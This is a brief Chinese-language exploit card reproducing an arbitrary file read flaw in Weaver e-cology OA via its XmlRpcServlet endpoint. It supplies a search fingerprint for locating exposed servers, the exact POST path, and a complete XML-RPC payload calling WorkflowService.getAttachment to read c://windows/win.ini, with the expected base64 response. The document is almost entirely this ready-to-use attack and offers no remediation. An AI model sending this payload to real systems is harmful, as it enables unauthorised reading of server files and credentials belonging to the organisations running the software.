# 泛微e-cologyXmlRpcServlet文件读取漏洞复现

- **系统**：泛微OA　|　**类型**：任意文件读取/写入　|　**CVE**：—
- **指纹**：`body="szFeatures"`
- **请求**：`POST /weaver/org.apache.xmlrpc.webserver.XmlRpcServlet HTTP/1.1`

**请求体 / payload**
```
<?xml version="1.0" encoding="UTF-8"?>
<methodCall>
<methodName>WorkflowService.getAttachment</methodName>
<params>
<param>
<value><string>c://windows/win.ini</string></value>
</param>
</params>
</methodCall>
```
- **预期**：200　|　base64